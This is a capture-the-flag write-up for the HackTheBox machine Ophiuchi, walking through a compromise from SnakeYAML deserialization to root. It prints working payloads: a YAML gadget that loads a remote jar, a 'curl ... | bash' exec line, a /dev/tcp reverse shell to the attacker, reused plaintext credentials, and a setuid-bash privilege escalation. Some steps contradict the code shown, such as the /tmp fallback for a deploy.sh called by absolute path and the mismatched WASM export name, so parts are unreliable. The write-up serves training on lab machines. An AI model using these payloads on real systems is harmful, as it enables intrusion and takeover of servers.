# HackTheBox — Ophiuchi

**Platform:** HackTheBox  
**Difficulty:** Medium  
**OS:** Linux  
**Category:** Deserialization / YAML / WebAssembly  
**Status:** Retired  

---

## Summary

Ophiuchi runs a Tomcat-based YAML parsing web app vulnerable to SnakeYAML deserialization, which provides an initial foothold. Privilege escalation exploits a sudo rule running a Go script that loads a WebAssembly (WASM) file from a writable path — replacing the WASM payload gives a root shell.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/ophiuchi 10.10.10.227
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p2
8080/tcp open  http    Apache Tomcat 9.0.38
```

---

## Web Exploitation

### Application Analysis

Visiting port 8080 shows a YAML parser web application. Submitting YAML:

```yaml
test: value
```

Returns the parsed result.

### SnakeYAML Deserialization — CVE-2022-1471 (type)

SnakeYAML supports special type constructors like `!!` tags that can instantiate arbitrary Java objects during deserialization.

**Proof of concept:**

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.14.X:8000/"]]]]
```

Start a Python HTTP server and submit the YAML — an HTTP request arrives, confirming code execution.

### Getting a Shell

Use the `yaml-payload` exploit tool:

```bash
git clone https://github.com/artsploit/yaml-payload
```

Edit `AwesomeScriptEngineFactory.java`:

```java
Runtime.getRuntime().exec("curl http://10.10.14.X/rev.sh | bash");
```

Compile and serve:

```bash
javac AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C . .
python3 -m http.server 8000
```

YAML payload to submit:

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.14.X:8000/yaml-payload.jar"]]]]
```

Also serve a `rev.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
```

Shell lands as **tomcat**.

---

## Lateral Movement — tomcat → admin

Check Tomcat config:

```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

```xml
<user username="admin" password="whythereisalwayssomebodytryingtobreakinto" roles="manager-gui,..."/>
```

Reuse password for SSH:

```bash
ssh admin@10.10.10.227
# Password: whythereisalwayssomebodytryingtobreakinto
```

---

## User Flag

```bash
cat /home/admin/user.txt
```

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

### Analyze the Go Script

```bash
cat /opt/wasm-functions/index.go
```

```go
package main

import (
    "fmt"
    wasm "github.com/wasmerio/wasmer-go/wasmer"
    "os/exec"
    "log"
)

func main() {
    wasmBytes, _ := wasm.ReadBytes("main.wasm")
    // ...
    ret, _ := add.Call()
    if ret == 1 {
        cmd := exec.Command("/bin/sh", "/opt/wasm-functions/deploy.sh")
        // ...
    }
}
```

The script reads `main.wasm` from the **current directory** and calls a function in it. If the WASM function returns `1`, it runs `deploy.sh`.

### Crafting a Malicious WASM

Write a WebAssembly Text (WAT) file that returns `1`:

```wat
(module
  (func (export "info") (result i32)
    i32.const 1
  )
)
```

Compile to WASM:

```bash
wat2wasm main.wat -o main.wasm
```

### Writable deploy.sh

```bash
cat /opt/wasm-functions/deploy.sh
# Check if it's writable
ls -la /opt/wasm-functions/deploy.sh
```

If writable, replace it:

```bash
echo '#!/bin/bash' > /opt/wasm-functions/deploy.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/wasm-functions/deploy.sh
```

If not writable, work from `/tmp`:

```bash
cd /tmp
mkdir wasm && cd wasm
cp /opt/wasm-functions/deploy.sh .
# Edit deploy.sh
echo '#!/bin/bash' > deploy.sh
echo 'chmod +s /bin/bash' >> deploy.sh
# Place our WASM
cp ~/main.wasm .
# Run from this directory
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

### Execute

```bash
sudo /usr/bin/go run /opt/wasm-functions/index.go
/bin/bash -p
whoami
# root
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **SnakeYAML deserialization** allows arbitrary Java class instantiation via `!!` constructor tags
- Config files in Tomcat (`tomcat-users.xml`) often contain plaintext credentials — always look
- **WASM (WebAssembly)** can be generated from WAT text format with `wat2wasm`
- When a sudo script loads files from a relative path, run it from a directory where you control those files
- Go scripts executing external files (`.sh`, `.wasm`) from relative paths are escalation vectors

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| yaml-payload | SnakeYAML exploit framework |
| javac / jar | Compile exploit class |
| wat2wasm | WebAssembly compilation |
| netcat | Reverse shell listener |
| ssh | Lateral movement |
